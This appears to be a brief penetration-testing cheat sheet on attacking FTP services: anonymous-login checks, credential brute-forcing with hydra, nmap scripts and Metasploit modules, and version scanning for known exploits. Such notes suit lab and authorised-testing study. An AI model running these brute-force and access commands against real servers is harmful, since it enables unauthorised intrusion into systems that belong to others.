# FTP
## anonymous login
ftp 192.1.56.3  
--- Name (192.97.159.3:root): anonymous  
--- Password: (blank)[ENTER]  
nmap -Pn -v 192.97.159.3 --script=ftp-anon  
msfconsole> auxiliary/scanner/ftp/anonymous
## bruteforcing usernames and passwords
hydra -L users.txt -P passwords.txt ftp://192.1.56.3  
nmap -Pn -v 192.1.56.3 --script=ftp-brute --script-args=userdb=users.txt,passdb=passwords.txt  
msfconsole> auxiliary/scanner/ftp/ftp_login  
## vulnerable software
nmap -Pn -v 192.1.56.3 -p21 -sT -sV  
exploitdb
